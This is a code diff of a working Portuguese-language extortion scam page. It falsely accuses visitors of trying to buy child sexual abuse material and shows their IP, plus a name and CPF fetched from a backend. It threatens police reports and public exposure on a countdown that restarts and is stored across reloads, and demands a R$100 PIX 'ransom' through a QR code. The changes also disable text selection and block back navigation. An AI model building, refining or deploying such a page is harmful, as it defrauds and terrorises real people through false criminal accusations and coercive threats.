@@ -2,7 +2,7 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
   <title>VOCÊ FOI PEGO NO FLAGRANTE</title>
   <style>
     * {
@@ -12,124 +12,123 @@
     }
     
     html, body {
-      background: #F4F4F4;
-      color: #111;
-      font-family: Arial, Roboto, sans-serif;
-      font-size: 18px;
-      line-height: 1.6;
-      height: 100vh;
+      background: #000;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      font-size: 16px;
+      line-height: 1.5;
+      width: 100%;
+      min-height: 100vh;
       overflow-x: hidden;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      padding: 20px;
+      padding: 15px;
     }
     
     .container {
       width: 100%;
-      max-width: 800px;
-      background: #F4F4F4;
-      padding: 30px;
+      max-width: 100%;
+      background: #000;
+      padding: 15px;
       text-align: center;
+      margin: 0 auto;
     }
     
     .main-title {
-      font-size: 32px;
+      font-size: 28px;
       font-weight: bold;
-      color: #D32F2F;
-      margin-bottom: 30px;
+      color: #FF0000;
+      margin-bottom: 20px;
       text-transform: uppercase;
+      text-align: center;
     }
     
     .intro-text {
       font-size: 20px;
       font-weight: bold;
-      color: #111;
-      margin-bottom: 25px;
-      text-align: left;
+      color: #ffffff;
+      margin-bottom: 20px;
+      text-align: center;
     }
     
     .accusation-text {
       font-size: 18px;
-      color: #111;
-      margin-bottom: 25px;
-      text-align: left;
-      line-height: 1.8;
+      color: #ffffff;
+      margin-bottom: 20px;
+      text-align: center;
+      line-height: 1.6;
     }
     
     .evidence-section {
-      background: #EEEEEE;
-      padding: 20px;
-      border-left: 5px solid #D32F2F;
-      margin: 25px 0;
-      text-align: left;
+      background: #1a1a1a;
+      padding: 15px;
+      border-left: 4px solid #FF0000;
+      margin: 20px 0;
+      text-align: center;
     }
     
     .evidence-title {
-      font-size: 20px;
+      font-size: 18px;
       font-weight: bold;
-      color: #D32F2F;
-      margin-bottom: 15px;
+      color: #FF0000;
+      margin-bottom: 12px;
+      text-align: center;
     }
     
     .evidence-list {
       list-style: none;
       padding: 0;
+      text-align: center;
     }
     
     .evidence-list li {
-      font-size: 16px;
-      color: #111;
-      margin: 8px 0;
-      padding-left: 20px;
-      position: relative;
+      font-size: 15px;
+      color: #ffffff;
+      margin: 6px 0;
+      text-align: center;
     }
     
     .evidence-list li::before {
-      content: "•";
-      color: #D32F2F;
+      content: "• ";
+      color: #FF0000;
       font-weight: bold;
-      position: absolute;
-      left: 0;
     }
     
     .crime-warning {
       font-size: 20px;
       font-weight: bold;
-      color: #D32F2F;
-      margin: 30px 0;
+      color: #FF0000;
+      margin: 25px 0;
       text-align: center;
     }
     
     .exposure-warning {
       font-size: 18px;
-      color: #111;
-      margin: 25px 0;
-      text-align: left;
+      color: #ffffff;
+      margin: 20px 0;
+      text-align: center;
     }
     
     .countdown-section {
-      background: #FFEBEE;
-      border: 2px solid #D32F2F;
-      padding: 25px;
-      margin: 30px 0;
+      background: #1a1a1a;
+      border: 2px solid #FF0000;
+      padding: 20px;
+      margin: 25px 0;
       text-align: center;
     }
     
     .countdown-label {
       font-size: 18px;
-      color: #111;
-      margin-bottom: 15px;
+      color: #ffffff;
+      margin-bottom: 12px;
+      text-align: center;
     }
     
     .countdown {
-      font-size: 48px;
+      font-size: 40px;
       font-weight: bold;
-      color: #D32F2F;
       font-family: 'Courier New', monospace;
       background: #000;
       color: #FF0000;
-      padding: 15px 30px;
+      padding: 15px 25px;
       border-radius: 5px;
       display: inline-block;
       letter-spacing: 2px;
@@ -138,167 +137,110 @@
     
     .countdown-warning {
       font-size: 16px;
-      color: #111;
-      margin-top: 15px;
+      color: #ffffff;
+      margin-top: 12px;
       font-style: italic;
-    }
-    
-    .solution-section {
-      background: #FFF8E1;
-      border: 3px solid #FFEB3B;
-      padding: 25px;
-      margin: 30px 0;
-    }
-    
-    .solution-title {
-      font-size: 24px;
-      font-weight: bold;
-      color: #111;
-      margin-bottom: 20px;
-    }
-    
-    .solution-text {
-      font-size: 18px;
-      color: #111;
-      margin-bottom: 20px;
-      text-align: left;
-    }
-    
-    .pix-info {
-      font-size: 22px;
-      font-weight: bold;
-      color: #D32F2F;
-      margin: 20px 0;
-    }
-    
-    .pix-details {
-      background: #FFFDE7;
-      border: 2px solid #FFC107;
-      padding: 20px;
-      margin: 20px 0;
-      text-align: left;
-    }
-    
-    .qr-section {
-      margin: 25px 0;
       text-align: center;
     }
     
-    .qr-code-container {
-      display: inline-block;
-      background: white;
+    .qr-section {
+      margin: 30px 0;
+      text-align: center;
       padding: 20px;
-      border: 2px solid #111;
-      margin: 15px 0;
+      border: 2px solid #ffff00;
+      background: rgba(255, 255, 0, 0.1);
+    }
+    
+    .qr-title {
+      font-size: 20px;
+      font-weight: bold;
+      color: #ffff00;
+      margin-bottom: 15px;
+    }
+    
+    .qr-code-container {
+      margin: 20px 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
     }
     
     .qr-code-image {
       max-width: 200px;
       max-height: 200px;
+      border: 2px solid #ffffff;
+      background: white;
+      padding: 10px;
     }
     
     .pix-code-section {
-      margin: 20px 0;
+      margin-top: 20px;
     }
     
     .pix-code-label {
       font-size: 16px;
-      color: #111;
+      color: #ffffff;
       margin-bottom: 10px;
-      font-weight: bold;
     }
     
     .pix-code {
       font-family: 'Courier New', monospace;
       font-size: 12px;
-      color: #111;
-      background: #F5F5F5;
-      padding: 15px;
-      border: 1px solid #CCC;
+      color: #ffff00;
+      background: rgba(0, 0, 0, 0.5);
+      padding: 10px;
+      border: 1px solid #cccccc;
       word-break: break-all;
-      text-align: left;
+      margin-bottom: 10px;
     }
     
     .loading-qr {
-      color: #111;
+      color: #ffff00;
       font-size: 16px;
       margin: 20px 0;
     }
     
     .error-qr {
-      color: #D32F2F;
+      color: #ff0000;
       font-size: 14px;
       margin: 20px 0;
-    }
-    
-    .final-warning {
-      background: #FFCDD2;
-      border: 2px solid #D32F2F;
-      padding: 20px;
-      margin: 30px 0;
-      text-align: left;
-    }
-    
-    .final-warning h3 {
-      color: #D32F2F;
-      font-size: 20px;
-      margin-bottom: 15px;
-    }
-    
-    .final-warning p {
-      color: #111;
-      font-size: 16px;
-      margin: 10px 0;
-    }
-    
-    .footer-threat {
-      margin-top: 40px;
-      padding-top: 20px;
-      border-top: 1px solid #CCC;
-      font-size: 14px;
-      color: #666;
-      text-align: center;
-    }
-    
-    .footer-threat p {
-      margin: 5px 0;
-    }
-    
-    .stats {
-      font-weight: bold;
-      color: #D32F2F;
     }
     
     /* Mobile responsiveness */
     @media (max-width: 768px) {
       body {
-        font-size: 16px;
+        font-size: 14px;
         padding: 10px;
       }
       
       .container {
-        padding: 20px;
+        padding: 10px;
       }
       
       .main-title {
-        font-size: 24px;
+        font-size: 22px;
       }
       
       .intro-text {
-        font-size: 18px;
+        font-size: 16px;
       }
       
       .countdown {
-        font-size: 32px;
-        padding: 10px 20px;
+        font-size: 28px;
+        padding: 10px 15px;
       }
       
       .pix-info {
         font-size: 18px;
       }
       
-      .solution-title {
-        font-size: 20px;
+      .qr-section {
+        margin: 20px 0;
+        padding: 15px;
+      }
+      
+      .qr-title {
+        font-size: 16px;
       }
       
       .qr-code-image {
@@ -308,23 +250,29 @@
       
       .pix-code {
         font-size: 10px;
-        padding: 10px;
+        padding: 8px;
+      }
+      
+      .pix-code-label {
+        font-size: 14px;
       }
     }
     
-    @media (max-width: 480px) {
-      .main-title {
-        font-size: 20px;
-      }
-      
-      .countdown {
-        font-size: 24px;
-        padding: 8px 15px;
-      }
-      
-      .container {
-        padding: 15px;
-      }
+    /* Disable all interactions */
+    * {
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      user-select: none;
+      -webkit-touch-callout: none;
+      -webkit-tap-highlight-color: transparent;
+    }
+    
+    body {
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      user-select: none;
     }
   </style>
 </head>
@@ -335,32 +283,37 @@
     </div>
     
     <div class="intro-text">
-      <span id="nome-cliente">[nome do cliente]</span>,<br>
+      <strong><span id="nome-cliente">[CARREGANDO NOME...]</span></strong>,<br>
       a gente rastreou sua tentativa de comprar conteúdo proibido com menores de idade.
     </div>
     
     <div class="accusation-text">
-      Você acessou isso às <span id="hora-tentativa">[hora da tentativa]</span>, usando o IP <span id="ip-cliente">[ip do cliente]</span>, e a porra do CPF <span id="cpf-cliente">[cpf do cliente]</span> tá amarrado junto.
+      Você acessou isso às <strong><span id="hora-tentativa">[CARREGANDO...]</span></strong>, usando o IP <strong><span id="ip-cliente">[CARREGANDO IP...]</span></strong>, e a porra do CPF <strong><span id="cpf-cliente">[CARREGANDO CPF...]</span></strong> tá amarrado junto.
       <br><br>
-      <strong>E a gente gravou tudo.</strong>
+      <strong style="color: #FF0000;">E A GENTE GRAVOU TUDO.</strong>
+      <br><br>
+      <strong>ISSO É CRIME FEDERAL - ARTIGO 241-A DO ECA</strong><br>
+      <strong>PENA: 3 A 6 ANOS DE PRISÃO + MULTA</strong>
     </div>
     
     <div class="evidence-section">
-      <div class="evidence-title">Temos:</div>
+      <div class="evidence-title">PROVAS COLETADAS:</div>
       <ul class="evidence-list">
-        <li>Seu histórico</li>
-        <li>Registro de acesso completo</li>
-        <li>Print do que você tentou comprar</li>
-        <li>Seu aparelho, localização e dados do sistema</li>
+        <li>Histórico completo de navegação</li>
+        <li>Screenshots da tentativa de compra</li>
+        <li>Dados do dispositivo e localização GPS</li>
+        <li>Registro de IP com horário exato</li>
+        <li>Dados bancários vinculados ao CPF</li>
       </ul>
     </div>
     
     <div class="crime-warning">
-      Você cometeu crime. E a gente tem prova.
+      VOCÊ SERÁ DENUNCIADO À POLÍCIA FEDERAL<br>
+      SEUS DADOS VÃO PARA O MINISTÉRIO PÚBLICO
     </div>
     
     <div class="exposure-warning">
-      Esse caso vai ser publicado em sites abertos, grupos de denúncia e fóruns com seu nome, CPF e IP, daqui a:
+      Esse caso vai ser publicado em sites de denúncia, grupos de WhatsApp, Facebook e enviado para seus contatos, daqui a:
     </div>
     
     <div class="countdown-section">
@@ -371,58 +324,41 @@
       </div>
     </div>
     
-    <div class="solution-section">
-      <div class="solution-title">✅ COMO EVITAR O VAZAMENTO</div>
-      <div class="solution-text">
-        Se tu pagou sem saber, foi enganado, ou quer impedir que isso exploda geral, tem uma chance de apagar isso da nossa base:
-      </div>
-      <div class="pix-info">PIX DE APAGAMENTO: R$ 100,00</div>
-      
-      <div class="pix-details">
-        <div id="qr-loading" class="loading-qr">
-          Gerando QR code PIX...
-        </div>
-        
-        <div id="qr-container" class="qr-section" style="display: none;">
-          <div class="qr-code-container">
-            <img id="qr-image" class="qr-code-image" alt="QR Code PIX" />
-          </div>
-        </div>
-        
-        <div id="pix-code-container" class="pix-code-section" style="display: none;">
-          <div class="pix-code-label">Chave PIX (Copia e Cola):</div>
-          <div id="pix-code" class="pix-code"></div>
-          <div style="font-size: 14px; color: #666; margin-top: 10px;">
-            <strong>Nome do grupo:</strong> Rede Digital Anônima
-          </div>
-        </div>
-        
-        <div id="qr-error" class="error-qr" style="display: none;">
-          Erro ao gerar QR code. Tente recarregar a página.
-        </div>
-      </div>
-      
-      <div class="solution-text">
-        Depois disso, o histórico é deletado.<br>
-        Se o tempo acabar, já era. Vai tudo pro ar.
-      </div>
+    <div class="crime-warning">
+      QUANDO O TEMPO ACABAR, TODOS OS SEUS DADOS VÃO SER EXPOSTOS:
     </div>
     
-    <div class="final-warning">
-      <h3>🛑 ATENÇÃO</h3>
-      <p>Isso aqui é sério.</p>
-      <p>Não tem volta.</p>
-      <p>Não tem e-mail.</p>
-      <p>Não tem suporte.</p>
-      <p><br>A gente não é empresa. A gente é rede.</p>
-      <p><br><strong>Você foi pego fazendo merda.</strong></p>
-      <p><br>Se pagar, apaga. Se não pagar, vaza.</p>
-    </div>
+    <ul class="evidence-list">
+      <li>Seu nome e CPF completo</li>
+      <li>Endereço residencial</li>
+      <li>Telefone e e-mail</li>
+      <li>Fotos das tentativas de compra</li>
+      <li>Histórico de navegação</li>
+      <li>Associados a crimes cibernéticos</li>
+    </ul>
     
-    <div class="footer-threat">
-      <p>Essa mensagem foi gerada automaticamente por um dos nossos servidores.</p>
-      <p><strong>Você está sendo monitorado.</strong></p>
-      <p class="stats">Mais de 19 pessoas já foram expostas.</p>
+    <div class="qr-section">
+      <div class="qr-title">PIX DE RESGATE - R$ 100,00</div>
+      
+      <div id="qr-loading" class="loading-qr">
+        Gerando QR code PIX...
+      </div>
+      
+      <div id="qr-container" class="qr-code-container" style="display: none;">
+        <img id="qr-image" class="qr-code-image" alt="QR Code PIX" />
+      </div>
+      
+      <div id="pix-code-container" class="pix-code-section" style="display: none;">
+        <div class="pix-code-label">Código PIX (Copia e Cola):</div>
+        <div id="pix-code" class="pix-code"></div>
+        <div style="font-size: 12px; color: #cccccc; margin-top: 10px;">
+          Copie o código acima ou escaneie o QR code
+        </div>
+      </div>
+      
+      <div id="qr-error" class="error-qr" style="display: none;">
+        Erro ao gerar QR code. Tente recarregar a página.
+      </div>
     </div>
   </div>
 
@@ -437,10 +373,10 @@
     
     // Dados padrão
     let dadosCliente = {
-      nome: '[nome do cliente]',
-      cpf: '[cpf do cliente]',
-      ip: '[ip do cliente]',
-      hora: '[hora da tentativa]'
+      nome: 'USUÁRIO DETECTADO',
+      cpf: 'CPF RASTREADO', 
+      ip: 'IP CAPTURADO',
+      hora: 'HORÁRIO REGISTRADO'
     };
     
     // Função para obter hora atual formatada
@@ -448,7 +384,19 @@
       const agora = new Date();
       const horas = agora.getHours().toString().padStart(2, '0');
       const minutos = agora.getMinutes().toString().padStart(2, '0');
-      return `${horas}:${minutos}`;
+      const segundos = agora.getSeconds().toString().padStart(2, '0');
+      return `${horas}:${minutos}:${segundos}`;
+    }
+    
+    // Função para obter IP do usuário
+    async function obterIPUsuario() {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+      } catch (error) {
+        return 'IP OCULTO';
+      }
     }
     
     // Função para criar nova sessão de timer
@@ -552,9 +500,20 @@
       }, 1000);
     }
     
-    // Função de fallback para timer padrão (comportamento original)
+    // Função de fallback para timer padrão com persistência
     function iniciarTimerPadrao() {
-      let tempoRestante = 10 * 60; // 10 minutos em segundos
+      // Verificar se já existe um timer salvo no localStorage
+      const timerKey = `timer_${token || 'default'}`;
+      let tempoInicial = localStorage.getItem(timerKey);
+      let tempoRestante;
+      
+      if (tempoInicial) {
+        const tempoDecorrido = Math.floor((Date.now() - parseInt(tempoInicial)) / 1000);
+        tempoRestante = Math.max(0, (10 * 60) - tempoDecorrido);
+      } else {
+        tempoRestante = 10 * 60; // 10 minutos em segundos
+        localStorage.setItem(timerKey, Date.now().toString());
+      }
       
       if (timerInterval) {
         clearInterval(timerInterval);
@@ -569,39 +528,53 @@
         if (tempoRestante > 0) {
           tempoRestante--;
         } else {
-          // Quando chegar a zero, reiniciar
+          // Quando chegar a zero, criar novo timer
+          localStorage.setItem(timerKey, Date.now().toString());
           tempoRestante = 10 * 60;
         }
       }, 1000);
     }
     
-    // Definir hora atual como padrão
-    dadosCliente.hora = obterHoraAtual();
-    document.getElementById('hora-tentativa').textContent = dadosCliente.hora;
-    
-    // Tentar buscar dados reais se token existir
-    if (token) {
-      fetch(`/api/dados-comprador?token=${token}`)
-        .then(response => response.json())
-        .then(data => {
+    // Inicializar dados na página
+    async function inicializarDados() {
+      // Definir hora atual
+      dadosCliente.hora = obterHoraAtual();
+      document.getElementById('hora-tentativa').textContent = dadosCliente.hora;
+      
+      // Obter IP do usuário
+      const ipUsuario = await obterIPUsuario();
+      dadosCliente.ip = ipUsuario;
+      document.getElementById('ip-cliente').textContent = dadosCliente.ip;
+      
+      // Tentar buscar dados reais se token existir
+      if (token) {
+        try {
+          const response = await fetch(`/api/dados-comprador?token=${token}`);
+          const data = await response.json();
+          
           if (data.success) {
-            if (data.nome && data.nome !== 'N/A') {
-              dadosCliente.nome = data.nome;
+            if (data.nome && data.nome !== 'N/A' && data.nome.trim() !== '') {
+              dadosCliente.nome = data.nome.toUpperCase();
               document.getElementById('nome-cliente').textContent = dadosCliente.nome;
             }
-            if (data.cpf && data.cpf !== 'N/A') {
+            if (data.cpf && data.cpf !== 'N/A' && data.cpf.trim() !== '') {
               dadosCliente.cpf = data.cpf;
               document.getElementById('cpf-cliente').textContent = dadosCliente.cpf;
             }
-            if (data.ip && data.ip !== 'N/A') {
+            if (data.ip && data.ip !== 'N/A' && data.ip.trim() !== '') {
               dadosCliente.ip = data.ip;
               document.getElementById('ip-cliente').textContent = dadosCliente.ip;
             }
           }
-        })
-        .catch(error => {
-          console.log('Usando dados padrão');
-        });
+        } catch (error) {
+          console.log('Usando dados padrão detectados');
+        }
+      }
+      
+      // Definir dados padrão se não carregou
+      document.getElementById('nome-cliente').textContent = dadosCliente.nome;
+      document.getElementById('cpf-cliente').textContent = dadosCliente.cpf;
+      document.getElementById('ip-cliente').textContent = dadosCliente.ip;
     }
     
     // Função para gerar QR code PIX
@@ -632,7 +605,7 @@
           
           // Mostrar QR code
           qrImage.src = data.qr_code_base64;
-          qrContainer.style.display = 'block';
+          qrContainer.style.display = 'flex';
           
           // Mostrar código PIX
           pixCode.textContent = data.pix_copia_cola;
@@ -670,6 +643,9 @@
         navigator.sendBeacon('/api/finalizar-sessao-timer', formData);
       }
     });
+    
+    // Inicializar dados na página
+    inicializarDados();
     
     // Impedir back/forward
     history.pushState(null, null, location.href);
